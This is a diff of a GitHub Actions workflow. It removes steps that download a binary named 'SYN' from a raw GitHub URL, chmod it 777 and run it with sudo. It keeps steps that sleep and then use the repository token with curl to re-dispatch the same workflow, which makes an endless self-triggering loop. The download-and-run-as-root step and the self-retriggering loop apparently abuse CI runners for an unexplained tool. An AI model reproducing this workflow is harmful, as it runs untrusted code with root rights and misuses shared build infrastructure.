@@ -14,9 +14,6 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
-          chmod 777 SYN
-          sudo ./SYN
           sleep 5m
           curl -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github.v3+json" -d '{"ref": "main"}' https://api.github.com/repos/niniubiwoc/run-script-action/actions/workflows/blank.yml/dispatches
   build2:
